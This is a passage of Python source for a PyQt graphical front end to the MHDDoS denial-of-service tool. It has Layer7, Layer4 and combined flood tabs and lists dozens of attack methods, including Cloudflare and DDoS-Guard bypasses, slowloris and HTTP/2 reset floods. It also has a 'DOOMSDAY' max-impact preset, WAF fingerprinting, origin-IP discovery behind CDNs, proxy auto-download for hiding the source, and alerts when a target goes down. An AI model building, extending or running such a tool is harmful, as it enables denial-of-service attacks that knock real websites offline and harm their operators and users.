QCheckBox::indicator:checked { background: #007acc; border: 1px solid #007acc; }
QCheckBox::indicator:hover { border: 1px solid #007acc; }
QTextEdit {
    background-color: #1e1e1e;
    color: #d4d4d4;
    border: 1px solid #3e3e42;
    border-radius: 4px;
    font-family: 'Menlo', 'Consolas', monospace;
    font-size: 11px;
}
QProgressBar {
    background-color: #2d2d30;
    border: 1px solid #3e3e42;
    border-radius: 4px;
    text-align: center;
    color: white;
    font-weight: bold;
    height: 22px;
}
QProgressBar::chunk { background-color: #007acc; border-radius: 3px; }
QLabel { color: #cccccc; }
QScrollArea { background: #1e1e1e; border: 1px solid #3e3e42; border-radius: 4px; }
QScrollBar:vertical { background: #2d2d30; width: 12px; }
QScrollBar::handle:vertical { background: #5e5e62; border-radius: 6px; min-height: 20px; }
QScrollBar::handle:vertical:hover { background: #007acc; }
QMessageBox { background: #252526; }
"""


class MainWindow(QMainWindow):
    # Cross-thread log signal — Python Thread workers (not QThread) MUST
    # emit this instead of calling self.log_message directly. Qt enforces
    # GUI mutation only from Qt thread; calling QTextEdit.append() from a
    # raw Python Thread triggers `QObject::startTimer` + `QTextCursor`
    # warnings and risks rare segfaults.
    _safe_log_signal = pyqtSignal(str)
    # ML Auto-Pick: emitted from worker thread, routed to Qt thread to apply
    # playbook to L7 checkboxes (Qt forbids GUI mutation from non-Qt threads).
    _ml_apply_playbook_signal = pyqtSignal(list, str, float)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("☠️ MHDDoS — Death Star Edition")
        self.setGeometry(80, 60, 1240, 880)
        self.setMinimumSize(1100, 800)
        # Apply dark theme globally
        self.setStyleSheet(DARK_THEME)
        # Wire cross-thread log bridge — invoked by Thread workers via
        # self._safe_log(msg) which routes to log_message on Qt thread.
        self._safe_log_signal.connect(self.log_message)
        # Wire ML Auto-Pick signal → handler runs on Qt thread
        self._ml_apply_playbook_signal.connect(self._ml_apply_playbook)



        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        
        self.layout = QVBoxLayout(self.central_widget)
        
        # 创建标签页
        self.tabs = QTabWidget()
        self.layout.addWidget(self.tabs)
        
        # Layer7 标签页
        self.layer7_tab = QWidget()
        self.init_layer7_ui()
        self.tabs.addTab(self.layer7_tab, "Layer7 Attack")
        
        # Layer4 标签页
        self.layer4_tab = QWidget()
        self.init_layer4_ui()
        self.tabs.addTab(self.layer4_tab, "Layer4 Attack")
        
        # Combined 标签页
        self.combined_tab = QWidget()
        self.init_combined_ui()
        self.tabs.addTab(self.combined_tab, "Combined Attack")

        # Self-Test Lab tab — local target server for safe attack validation
        self.selftest_tab = QWidget()
        self.init_selftest_ui()
        self.tabs.addTab(self.selftest_tab, "🧪 Self-Test Lab")

        # === Real-time Stats Dashboard ===

        stats_group = QGroupBox("📊 Live Stats")
        stats_layout = QHBoxLayout()
        self.stats_rps_label = QLabel("RPS: --")
        self.stats_rps_label.setStyleSheet("QLabel { font-weight: bold; color: #00aa00; font-size: 13px; }")
        self.stats_total_label = QLabel("Total: --")
        self.stats_total_label.setStyleSheet("QLabel { font-weight: bold; color: #0066cc; font-size: 13px; }")
        self.stats_bytes_label = QLabel("BW: --")
        self.stats_bytes_label.setStyleSheet("QLabel { font-weight: bold; color: #cc6600; font-size: 13px; }")
        self.stats_elapsed_label = QLabel("⏱ 00:00")
        self.stats_elapsed_label.setStyleSheet("QLabel { font-weight: bold; color: #aa00aa; font-size: 13px; }")
        self.stats_errors_label = QLabel("Errors: --")
        self.stats_errors_label.setStyleSheet("QLabel { font-weight: bold; color: #cc0000; font-size: 13px; }")
        for w in (self.stats_rps_label, self.stats_total_label, self.stats_bytes_label,
                  self.stats_elapsed_label, self.stats_errors_label):
            stats_layout.addWidget(w)
        stats_layout.addStretch()
        stats_group.setLayout(stats_layout)
        self.layout.addWidget(stats_group)

        # === Progress Bar ===
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setFormat("Idle - 0%")
        self.layout.addWidget(self.progress_bar)

        self.log_group = QGroupBox("Attack Log")
        self.log_layout = QVBoxLayout()
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        # Performance: limit log lines to prevent slowdown after long runs
        self.log_output.document().setMaximumBlockCount(2000)
        self.log_layout.addWidget(self.log_output)
        self.log_group.setLayout(self.log_layout)
        self.layout.addWidget(self.log_group)
        
        self.status_label = QLabel("Ready")
        self.layout.addWidget(self.status_label)
        
        self.attack_threads = []
        self.attack_thread = None
        self.event = threading.Event()
        self.event.clear()
        
        # Stats tracking
        self._attack_start_time = None
        self._attack_duration = 0
        self._total_requests = 0
        self._total_errors = 0
        
        self.status_timer = QTimer(self)
        self.status_timer.timeout.connect(self.check_attack_status)
        
        # Live stats refresh timer (every 500ms)
        self.live_stats_timer = QTimer(self)
        self.live_stats_timer.timeout.connect(self._update_live_stats)

    def init_layer7_ui(self):
        layout = QVBoxLayout(self.layer7_tab)
        
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("Target URL:"))
        self.url_input = QLineEdit("http://example.com")
        url_layout.addWidget(self.url_input)
        layout.addLayout(url_layout)
        
        method_layout = QHBoxLayout()
        method_layout.addWidget(QLabel("Attack method:"))
        self.method_combo = QComboBox()
        self.method_combo.addItems(sorted(Methods.LAYER7_METHODS))
        method_layout.addWidget(self.method_combo)
        layout.addLayout(method_layout)
        
        proxy_layout = QHBoxLayout()
        proxy_layout.addWidget(QLabel("Proxy:"))
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(["HTTP", "SOCKS4", "SOCKS5", "None"])
        proxy_layout.addWidget(self.proxy_type_combo)
        
        proxy_layout.addWidget(QLabel("Proxy files:"))
        self.proxy_file_input = QLineEdit(str(__dir__ / "files/proxies/http.txt"))
        proxy_layout.addWidget(self.proxy_file_input)
        
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_proxy_file)
        proxy_layout.addWidget(browse_btn)
        layout.addLayout(proxy_layout)
        
        rpc_layout = QHBoxLayout()
        rpc_layout.addWidget(QLabel("RPC (Requests/Connection):"))
        self.rpc_spin = QSpinBox()
        self.rpc_spin.setRange(1, 100)
        self.rpc_spin.setValue(10)
        rpc_layout.addWidget(self.rpc_spin)
        layout.addLayout(rpc_layout)
        
        # Auto RPC checkbox
        auto_rpc_layout = QHBoxLayout()
        self.auto_rpc_check = QCheckBox("Auto RPC (adaptif — tanpa setting manual)")
        self.auto_rpc_check.setToolTip("RPC auto-adjust based on request success rate: naik saat 200 OK, turun saat 429/503")
        auto_rpc_layout.addWidget(self.auto_rpc_check)
        auto_rpc_layout.addStretch()
        layout.addLayout(auto_rpc_layout)
        
        threads_layout = QHBoxLayout()
        threads_layout.addWidget(QLabel("Thread:"))
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 5000)
        self.threads_spin.setValue(100)
        threads_layout.addWidget(self.threads_spin)
        
        threads_layout.addWidget(QLabel("Durate (Sec):"))
        self.duration_spin = QSpinBox()
        self.duration_spin.setRange(1, 3600)
        self.duration_spin.setValue(60)
        threads_layout.addWidget(self.duration_spin)
        layout.addLayout(threads_layout)
        
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("Start attack")
        self.start_btn.clicked.connect(self.start_layer7_attack)
        btn_layout.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("Stop")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)
        
        self.force_stop_btn = QPushButton("Force stop")
        self.force_stop_btn.clicked.connect(self.force_stop_attack)
        self.force_stop_btn.setEnabled(False)
        btn_layout.addWidget(self.force_stop_btn)
        layout.addLayout(btn_layout)

    def init_layer4_ui(self):
        layout = QVBoxLayout(self.layer4_tab)
        
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel("Target address:"))
        self.target_input = QLineEdit("192.168.1.1:80")
        target_layout.addWidget(self.target_input)
        layout.addLayout(target_layout)
        
        method_layout = QHBoxLayout()
        method_layout.addWidget(QLabel("Attacking methods:"))
        self.layer4_method_combo = QComboBox()
        self.layer4_method_combo.addItems(sorted(Methods.LAYER4_METHODS))
        method_layout.addWidget(self.layer4_method_combo)
        layout.addLayout(method_layout)
        
        reflector_layout = QHBoxLayout()
        reflector_layout.addWidget(QLabel("reflector files:"))
        self.reflector_input = QLineEdit(str(__dir__ / "files/reflectors.txt"))
        reflector_layout.addWidget(self.reflector_input)
        
        browse_ref_btn = QPushButton("Browse")
        browse_ref_btn.clicked.connect(self.browse_reflector_file)
        reflector_layout.addWidget(browse_ref_btn)
        layout.addLayout(reflector_layout)
        
        threads_layout = QHBoxLayout()
        threads_layout.addWidget(QLabel("Thread:"))
        self.layer4_threads_spin = QSpinBox()
        self.layer4_threads_spin.setRange(1, 5000)
        self.layer4_threads_spin.setValue(100)
        threads_layout.addWidget(self.layer4_threads_spin)
        
        threads_layout.addWidget(QLabel("Durate (Second):"))
        self.layer4_duration_spin = QSpinBox()
        self.layer4_duration_spin.setRange(1, 3600)
        self.layer4_duration_spin.setValue(60)
        threads_layout.addWidget(self.layer4_duration_spin)
        layout.addLayout(threads_layout)
        
        # Auto RPC checkbox for Layer4
        auto_rpc_l4_layout = QHBoxLayout()
        self.auto_rpc_l4_check = QCheckBox("Auto RPC (adaptif)")
        self.auto_rpc_l4_check.setToolTip("RPC auto-adjust for Layer4 methods too")
        auto_rpc_l4_layout.addWidget(self.auto_rpc_l4_check)
        auto_rpc_l4_layout.addStretch()
        layout.addLayout(auto_rpc_l4_layout)
        
        btn_layout = QHBoxLayout()
        self.start_layer4_btn = QPushButton("Start attack")
        self.start_layer4_btn.clicked.connect(self.start_layer4_attack)
        btn_layout.addWidget(self.start_layer4_btn)
        
        self.stop_layer4_btn = QPushButton("Stop")
        self.stop_layer4_btn.clicked.connect(self.stop_attack)
        self.stop_layer4_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_layer4_btn)
        
        self.force_stop_layer4_btn = QPushButton("Force stop")
        self.force_stop_layer4_btn.clicked.connect(self.force_stop_attack)
        self.force_stop_layer4_btn.setEnabled(False)
        btn_layout.addWidget(self.force_stop_layer4_btn)
        layout.addLayout(btn_layout)

    def init_combined_ui(self):
        # Combined tab has way more widgets than fit in window — wrap in scroll area
        # so user can reach Start button, Adaptive++ controls, etc. without resizing.
        outer_layout = QVBoxLayout(self.combined_tab)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll_area.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        scroll_content = QWidget()
        scroll_area.setWidget(scroll_content)
        outer_layout.addWidget(scroll_area)
        layout = QVBoxLayout(scroll_content)

        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("Target URL:"))
        self.combined_url_input = QLineEdit("http://example.com")
        url_layout.addWidget(self.combined_url_input)
        check_btn = QPushButton("Check Website")
        check_btn.clicked.connect(self.check_website)
        url_layout.addWidget(check_btn)
        layout.addLayout(url_layout)


        l7_group = QGroupBox("Layer7 Methods (by target type)")
        l7_group_layout = QVBoxLayout()
        self.l7_method_checks = {}
        l7_scroll = QScrollArea()
        l7_scroll.setWidgetResizable(True)
        l7_container = QWidget()
        l7_check_layout = QVBoxLayout(l7_container)

        categories = {
            "General HTTP Flood": ["GET", "POST", "OVH", "STRESS", "DYN", "EVEN", "PPS", "COOKIE", "GSB"],
            "Cloudflare Protected": ["CFB", "CFBUAM", "BYPASS", "IMPERSONATE"],
            "Slow / Connection Drain": ["SLOW", "RHEX", "STOMP", "HEAD", "NULL", "SLOWLORIS"],
            "WordPress / CMS": ["XMLRPC", "BOT", "WORDPRESS", "COOKIE_HARVEST"],
            "Apache Server": ["APACHE", "RANGE_CRASH"],
            "Heavy / Bandwidth": ["DOWNLOADER", "BOMB", "KILLER", "TLS_FLOOD", "MEGA"],
            "DDoS-Guard": ["DGB", "AVB"],
            "Tor / Onion": ["TOR"],
            "2026 Upgrades": ["ASYNC", "H2_RST", "XMLRPC_MULTI", "STEALTH", "MIX", "RAPID", "QUIC",
                              "H2", "H2_PRIORITY", "H2_CONT", "WS", "GQL"],
        }

        for cat_name, methods in categories.items():
            cat_gb = QGroupBox(cat_name)
            cat_layout = QVBoxLayout()
            btn_layout = QHBoxLayout()
            select_btn = QPushButton("Select all")
            select_btn.setMinimumWidth(110)
            deselect_btn = QPushButton("Deselect all")
            deselect_btn.setMinimumWidth(110)
            btn_layout.addWidget(select_btn)
            btn_layout.addWidget(deselect_btn)
            btn_layout.addStretch()
            cat_layout.addLayout(btn_layout)
            for m in methods:
                cb = QCheckBox(m)
                self.l7_method_checks[m] = cb
                cat_layout.addWidget(cb)
            cat_gb.setLayout(cat_layout)
            l7_check_layout.addWidget(cat_gb)
            select_btn.clicked.connect(lambda checked, cat=cat_name, cats=categories: [self.l7_method_checks[m].setChecked(True) for m in cats[cat]])
            deselect_btn.clicked.connect(lambda checked, cat=cat_name, cats=categories: [self.l7_method_checks[m].setChecked(False) for m in cats[cat]])

        def set_defaults(*cats):
            for cat in cats:
                for m in categories[cat]:
                    self.l7_method_checks[m].setChecked(True)

        set_defaults("General HTTP Flood", "Cloudflare Protected")

        l7_scroll.setWidget(l7_container)
        l7_scroll.setMinimumHeight(220)
        l7_group_layout.addWidget(l7_scroll)
        l7_group.setLayout(l7_group_layout)
        layout.addWidget(l7_group)

        l4_group = QGroupBox("Layer4 Methods")
        l4_group_layout = QVBoxLayout()
        self.l4_method_checks = {}
        l4_scroll = QScrollArea()
        l4_scroll.setWidgetResizable(True)
        l4_container = QWidget()
        l4_check_layout = QVBoxLayout(l4_container)
        for m in sorted(Methods.LAYER4_METHODS):
            cb = QCheckBox(m)
            self.l4_method_checks[m] = cb
            l4_check_layout.addWidget(cb)
        l4_scroll.setWidget(l4_container)
        l4_scroll.setMinimumHeight(140)
        l4_group_layout.addWidget(l4_scroll)
        l4_group.setLayout(l4_group_layout)
        layout.addWidget(l4_group)

        proxy_layout = QHBoxLayout()
        proxy_layout.addWidget(QLabel("Proxy:"))
        self.combined_proxy_type_combo = QComboBox()
        self.combined_proxy_type_combo.addItems(["HTTP", "SOCKS4", "SOCKS5", "None"])
        proxy_layout.addWidget(self.combined_proxy_type_combo)
        proxy_layout.addWidget(QLabel("Proxy files:"))
        self.combined_proxy_file_input = QLineEdit(str(__dir__ / "files/proxies/http.txt"))
        proxy_layout.addWidget(self.combined_proxy_file_input)
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_combined_proxy_file)
        proxy_layout.addWidget(browse_btn)
        auto_btn = QPushButton("Auto Download")
        auto_btn.clicked.connect(self.auto_download_proxies)
        proxy_layout.addWidget(auto_btn)
        test_btn = QPushButton("Test")
        test_btn.clicked.connect(self.test_proxies)
        proxy_layout.addWidget(test_btn)
        layout.addLayout(proxy_layout)

        rpc_layout = QHBoxLayout()
        rpc_layout.addWidget(QLabel("RPC (Requests/Connection):"))
        self.combined_rpc_spin = QSpinBox()
        self.combined_rpc_spin.setRange(1, 100)
        self.combined_rpc_spin.setValue(10)
        rpc_layout.addWidget(self.combined_rpc_spin)
        layout.addLayout(rpc_layout)

        # Auto RPC checkbox for Combined
        auto_rpc_combined_layout = QHBoxLayout()
        self.auto_rpc_combined_check = QCheckBox("Auto RPC (adaptif)")
        self.auto_rpc_combined_check.setChecked(True)
        self.auto_rpc_combined_check.setToolTip("RPC auto-adjust: naik saat 200 OK, turun saat 429/503. Tanpa setting manual.")
        auto_rpc_combined_layout.addWidget(self.auto_rpc_combined_check)
        auto_rpc_combined_layout.addStretch()
        layout.addLayout(auto_rpc_combined_layout)

        # =============== ADAPTIVE++ CONTROL CENTER (groupbox) ===============
        adaptive_group = QGroupBox("🧠 Adaptive++ Control Center")
        adaptive_group.setStyleSheet(
            "QGroupBox { color: #ff8c42; border: 1px solid #ff8c42; }"
            "QGroupBox::title { color: #ff8c42; }"
        )
        adaptive_outer = QVBoxLayout()

        # Row 1: Master switch + aggressiveness combo
        adaptive_row1 = QHBoxLayout()
        self.adaptive_check = QCheckBox("Enable Adaptive AI")
        self.adaptive_check.setStyleSheet("QCheckBox { color: #ff8c42; font-weight: bold; font-size: 13px; }")
        self.adaptive_check.setChecked(False)
        self.adaptive_check.setToolTip(
            "Adaptive++ stack:\n"
            "→ Pre-attack WAF probe seeds optimal methods\n"
            "→ Bayesian Thompson Sampling per method\n"
            "→ Fast 5s ResponseSwapper drops blocked methods\n"
            "→ Method blacklist with 30-60s cooldown\n"
            "→ Adaptive heartbeat (3-12s, shrinks when chaotic)\n"
            "→ Target health monitor with webhook on down/up"
        )
        adaptive_row1.addWidget(self.adaptive_check)

        adaptive_row1.addSpacing(20)
        adaptive_row1.addWidget(QLabel("Aggressiveness:"))
        self.adaptive_aggro_combo = QComboBox()
        self.adaptive_aggro_combo.addItems(["🐢 CALM", "🚶 NORMAL", "🏃 AGGRESSIVE", "💀 UNHINGED"])
        self.adaptive_aggro_combo.setCurrentIndex(1)  # NORMAL
        self.adaptive_aggro_combo.setMinimumWidth(160)
        self.adaptive_aggro_combo.setToolTip(
            "CALM: 8-20s heartbeat, 75% block tolerance, conservative\n"
            "NORMAL: 5-12s heartbeat, 60% tolerance — recommended\n"
            "AGGRESSIVE: 3-8s heartbeat, 50% tolerance, faster swaps\n"
            "UNHINGED: 2-5s heartbeat, 40% tolerance, high reactivity"
        )
        adaptive_row1.addWidget(self.adaptive_aggro_combo)
        adaptive_row1.addStretch()

        # Status indicator label
        self.adaptive_status_label = QLabel("● IDLE")
        self.adaptive_status_label.setStyleSheet("QLabel { color: #888; font-weight: bold; }")
        self.adaptive_status_label.setToolTip("Live status: IDLE / READY / RUNNING / CHAOTIC / STABLE")
        adaptive_row1.addWidget(self.adaptive_status_label)
        adaptive_outer.addLayout(adaptive_row1)

        # Row 2: Feature toggles (4 checkboxes balanced)
        adaptive_row2 = QHBoxLayout()
        self.adaptive_recon_check = QCheckBox("🔍 Pre-attack WAF recon")
        self.adaptive_recon_check.setChecked(True)
        self.adaptive_recon_check.setToolTip(
            "Probe target before attack. Fingerprint WAF (Cloudflare/Akamai/etc),\n"
            "then seed Bayesian portfolio with WAF-specific bypass methods."
        )
        adaptive_row2.addWidget(self.adaptive_recon_check)

        self.adaptive_health_check = QCheckBox("💓 Target health monitor")
        self.adaptive_health_check.setChecked(True)
        self.adaptive_health_check.setToolTip("Probe target every 10s. Detects up→down and down→up transitions.")
        adaptive_row2.addWidget(self.adaptive_health_check)

        self.adaptive_stop_on_down_check = QCheckBox("🛑 Stop on target down")
        self.adaptive_stop_on_down_check.setChecked(False)
        self.adaptive_stop_on_down_check.setToolTip("Auto-stop attack when target goes down (kindness setting).")
        adaptive_row2.addWidget(self.adaptive_stop_on_down_check)

        # Adaptive metrics (live, populated during attack)
        adaptive_row2.addStretch()
        self.adaptive_metrics_label = QLabel("HB: --  Banned: 0  WAF: -")
        self.adaptive_metrics_label.setStyleSheet("QLabel { color: #66aaff; font-family: 'Menlo', monospace; }")
        adaptive_row2.addWidget(self.adaptive_metrics_label)
        adaptive_outer.addLayout(adaptive_row2)

        adaptive_group.setLayout(adaptive_outer)
        layout.addWidget(adaptive_group)

        # =============== WEBHOOK NOTIFICATIONS (groupbox) ===============
        webhook_group = QGroupBox("📢 Webhook Notifications (optional)")
        webhook_layout = QHBoxLayout()
        webhook_layout.addWidget(QLabel("Discord:"))
        self.webhook_discord_input = QLineEdit("")
        self.webhook_discord_input.setPlaceholderText("https://discord.com/api/webhooks/...")
        self.webhook_discord_input.setToolTip("Optional. Discord webhook URL for live alerts.")
        webhook_layout.addWidget(self.webhook_discord_input, 3)
        webhook_layout.addSpacing(10)
        webhook_layout.addWidget(QLabel("Telegram bot:"))
        self.webhook_tg_token_input = QLineEdit("")
        self.webhook_tg_token_input.setPlaceholderText("token")
        self.webhook_tg_token_input.setMaximumWidth(160)
        webhook_layout.addWidget(self.webhook_tg_token_input)
        webhook_layout.addWidget(QLabel("chat:"))
        self.webhook_tg_chat_input = QLineEdit("")
        self.webhook_tg_chat_input.setPlaceholderText("chat id")
        self.webhook_tg_chat_input.setMaximumWidth(120)
        webhook_layout.addWidget(self.webhook_tg_chat_input)
        webhook_group.setLayout(webhook_layout)
        layout.addWidget(webhook_group)

        threads_layout = QHBoxLayout()
        threads_layout.addWidget(QLabel("Thread:"))
        self.combined_threads_spin = QSpinBox()
        self.combined_threads_spin.setRange(1, 5000)
        self.combined_threads_spin.setValue(100)
        threads_layout.addWidget(self.combined_threads_spin)
        threads_layout.addWidget(QLabel("Durate (Sec):"))
        self.combined_duration_spin = QSpinBox()
        self.combined_duration_spin.setRange(1, 3600)
        self.combined_duration_spin.setValue(60)
        threads_layout.addWidget(self.combined_duration_spin)
        layout.addLayout(threads_layout)

        # --- Preset Row: One-Tap Auto + Main Volumetric + WAF Bypass ---
        preset_layout = QHBoxLayout()

        onetap_btn = QPushButton("🚀 ONE-TAP AUTO")
        onetap_btn.setStyleSheet(
            "QPushButton { background-color: #009966; color: white; font-weight: bold; "
            "font-size: 14px; padding: 8px 18px; border-radius: 5px; border: 2px solid #00ffaa; }"
            "QPushButton:hover { background-color: #00cc88; }"
        )
        onetap_btn.setToolTip(
            "Smart auto-attack: scan target → auto-pick L7 methods + threads + RPC + proxy + multiprocess.\n"
            "Tinggal isi URL + klik tombol ini, semua disesuaikan otomatis lalu attack langsung mulai.\n"
            "Pencocokan based on WAF detected, server, CMS, etc."
        )
        onetap_btn.clicked.connect(self._one_tap_auto)
        preset_layout.addWidget(onetap_btn)

        vol_btn = QPushButton("🧨 Main Volumetric")

        vol_btn.setStyleSheet("QPushButton { background-color: #cc3300; color: white; font-weight: bold; font-size: 13px; padding: 6px 14px; border-radius: 5px; }")
        vol_btn.setToolTip("All bandwidth-heavy methods: TLS_FLOOD + GET + STRESS + DYN + DOWNLOADER + PPS + OVH + QUIC + H2_RST + RAPID + ASYNC")
        vol_btn.clicked.connect(self._preset_main_volumetric)
        preset_layout.addWidget(vol_btn)

        waf_btn = QPushButton("🧅 WAF 7-Layer Bypass")
        waf_btn.setStyleSheet("QPushButton { background-color: #336699; color: white; font-weight: bold; font-size: 13px; padding: 6px 14px; border-radius: 5px; }")
        waf_btn.setToolTip("Bypass all: CFB + CFBUAM + BYPASS + DGB + AVB + STEALTH + MIX + XMLRPC_MULTI + COOKIE_HARVEST + SLOWLORIS")
        waf_btn.clicked.connect(self._preset_waf_bypass)
        preset_layout.addWidget(waf_btn)

        doomsday_btn = QPushButton("☠️ DOOMSDAY")
        doomsday_btn.setStyleSheet(
            "QPushButton { background-color: #000000; color: #ff0000; font-weight: bold; "
            "font-size: 14px; padding: 8px 18px; border-radius: 5px; border: 2px solid #ff0000; }"
            "QPushButton:hover { background-color: #330000; }"
        )
        doomsday_btn.setToolTip(
            "MAXIMUM IMPACT — ALL 25 L7 methods + Adaptive AI + max threads + max RPC.\n"
            "Combines: TLS_FLOOD + H2_RST + RAPID + QUIC + ASYNC + SLOWLORIS + XMLRPC_MULTI + STEALTH + all WAF bypass.\n"
            "FOR AUTHORIZED PENETRATION TESTING ONLY."
        )
        doomsday_btn.clicked.connect(self._preset_doomsday)
        preset_layout.addWidget(doomsday_btn)

        preset_layout.addStretch()
        layout.addLayout(preset_layout)

        ganas_layout = QHBoxLayout()
        self.ganas_check = QCheckBox("GANAS MODE — ALL 25 L7 methods + max threads")
        self.ganas_check.setStyleSheet("QCheckBox { color: red; font-weight: bold; font-size: 14px; }")
        self.ganas_check.setChecked(False)
        ganas_layout.addWidget(self.ganas_check)
        ganas_layout.addStretch()
        layout.addLayout(ganas_layout)

        # === Profile Save/Load + Advanced Tools ===
        profile_layout = QHBoxLayout()
        save_profile_btn = QPushButton("💾 Save Profile")
        save_profile_btn.setToolTip("Save current attack config to JSON")
        save_profile_btn.clicked.connect(self._save_profile)
        load_profile_btn = QPushButton("📂 Load Profile")
        load_profile_btn.setToolTip("Load attack config from saved JSON")
        load_profile_btn.clicked.connect(self._load_profile)
        origin_btn = QPushButton("🎯 Find Origin IP")
        origin_btn.setStyleSheet("QPushButton { background-color: #663399; color: white; font-weight: bold; }")
        origin_btn.setToolTip("Discover real origin IP behind Cloudflare/CDN via cert SANs + crt.sh + DNS history")
        origin_btn.clicked.connect(self._find_origin_ip)
        report_btn = QPushButton("📊 Export Report")
        report_btn.setStyleSheet("QPushButton { background-color: #006633; color: white; font-weight: bold; }")
        report_btn.setToolTip("Export last attack as HTML report with stats")
        report_btn.clicked.connect(self._export_attack_report)
        ml_btn = QPushButton("🤖 ML Auto-Pick")
        ml_btn.setStyleSheet("QPushButton { background-color: #cc6600; color: white; font-weight: bold; }")
        ml_btn.setToolTip(
            "Use sklearn classifier to detect WAF brand,\n"
            "then auto-select optimal L7 methods playbook.\n"
            "Confidence threshold 0.65 — falls back to safe playbook on uncertain."
        )
        ml_btn.clicked.connect(self._ml_auto_pick)
        profile_layout.addWidget(save_profile_btn)
        profile_layout.addWidget(load_profile_btn)
        profile_layout.addWidget(origin_btn)
        profile_layout.addWidget(report_btn)
        profile_layout.addWidget(ml_btn)
        profile_layout.addStretch()
        layout.addLayout(profile_layout)


        # === Connection Pool & Multiprocessing checkboxes ===
        adv_layout = QHBoxLayout()
        self.keepalive_check = QCheckBox("♻ HTTP Keepalive Pool (5-10x throughput)")
        self.keepalive_check.setToolTip("Reuse TCP connections across requests instead of new socket per request")
        self.keepalive_check.setChecked(False)
        adv_layout.addWidget(self.keepalive_check)

        # Auto-detect cores for clearer mp_check label
        try:
            from multiprocessing import cpu_count as _cc
            _cores_count = _cc()
        except Exception:
            _cores_count = 4
        self.mp_check = QCheckBox(f"🧬 Multiprocess Mode ({_cores_count} cores → ~{_cores_count - 1}× firepower)")
        self.mp_check.setToolTip(
            f"OFF: Single process, GIL bottleneck on CPU-heavy methods (TLS, H2, encryption)\n"
            f"ON: Spawn {_cores_count - 1} subprocess workers, each with own GIL.\n"
            f"True parallelism on this {_cores_count}-core machine."
        )
        self.mp_check.setChecked(False)
        adv_layout.addWidget(self.mp_check)

        # Live status label — shows actual mode + cores when attack runs
        self.mp_status_label = QLabel(f"💻 {_cores_count} cores | Mode: SINGLE")
        self.mp_status_label.setStyleSheet("QLabel { color: #888; font-family: 'Menlo', monospace; }")
        adv_layout.addWidget(self.mp_status_label)
        # Update label on checkbox toggle
        def _update_mp_label():
            if self.mp_check.isChecked():
                self.mp_status_label.setText(f"💻 {_cores_count} cores | Mode: MULTI ({_cores_count - 1}× procs)")
                self.mp_status_label.setStyleSheet("QLabel { color: #00ff88; font-weight: bold; font-family: 'Menlo', monospace; }")
            else:
                self.mp_status_label.setText(f"💻 {_cores_count} cores | Mode: SINGLE (GIL-limited)")
                self.mp_status_label.setStyleSheet("QLabel { color: #888; font-family: 'Menlo', monospace; }")
        self.mp_check.toggled.connect(lambda _: _update_mp_label())
        _update_mp_label()  # Set initial state

        adv_layout.addStretch()
        layout.addLayout(adv_layout)


        btn_layout = QHBoxLayout()
        self.start_combined_btn = QPushButton("Start attack")
        self.start_combined_btn.clicked.connect(self.start_combined_attack)
        btn_layout.addWidget(self.start_combined_btn)
        self.stop_combined_btn = QPushButton("Stop")
        self.stop_combined_btn.clicked.connect(self.stop_attack)
        self.stop_combined_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_combined_btn)
        self.force_stop_combined_btn = QPushButton("Force stop")
        self.force_stop_combined_btn.clicked.connect(self.force_stop_attack)
        self.force_stop_combined_btn.setEnabled(False)
        btn_layout.addWidget(self.force_stop_combined_btn)
        layout.addLayout(btn_layout)

    def browse_combined_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select the proxy file", "", "Text Document (*.txt)")
        if file_path:
            self.combined_proxy_file_input.setText(file_path)

    def auto_download_proxies(self):
        proxy_type = self.combined_proxy_type_combo.currentText()
        self.log_message(f"Auto downloading {proxy_type} proxies...")
        urls = {
            "HTTP": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "SOCKS4": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
            "SOCKS5": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
        }
        url = urls.get(proxy_type)
        if not url:
            self.log_message("Auto download only supports HTTP/SOCKS4/SOCKS5")
            return
        try:
            import requests
            r = requests.get(url, timeout=30)
            proxies = [l.strip() for l in r.text.splitlines() if l.strip()]
            proxy_path = Path(__dir__ / "files/proxies/auto_proxies.txt")
            proxy_path.parent.mkdir(parents=True, exist_ok=True)
            with proxy_path.open("w") as f:
                f.write("\n".join(proxies))
            self.combined_proxy_file_input.setText(str(proxy_path))
            self.log_message(f"Downloaded {len(proxies)} proxies to {proxy_path}")
        except Exception as e:
            self.log_message(f"Auto download failed: {e}")

    def test_proxies(self):
        proxy_file = self.combined_proxy_file_input.text().strip()
        self.log_message("Testing proxies...")
        try:
            import requests, concurrent.futures, time as ttime
            with Path(proxy_file).open("r") as f:
                proxies = [l.strip() for l in f if l.strip()]
            working = []
            def check_one(proxy_line):
                try:
                    prot = self.combined_proxy_type_combo.currentText().lower()
                    proxy_url = f"{prot}://{proxy_line}"
                    r = requests.get("http://httpbin.org/ip", proxies={"http": proxy_url, "https": proxy_url}, timeout=5)
                    if r.status_code == 200:
                        return proxy_line
                except:
                    pass
                return None
            with concurrent.futures.ThreadPoolExecutor(50) as ex:
                results = list(ex.map(check_one, proxies[:200]))
            working = [r for r in results if r]
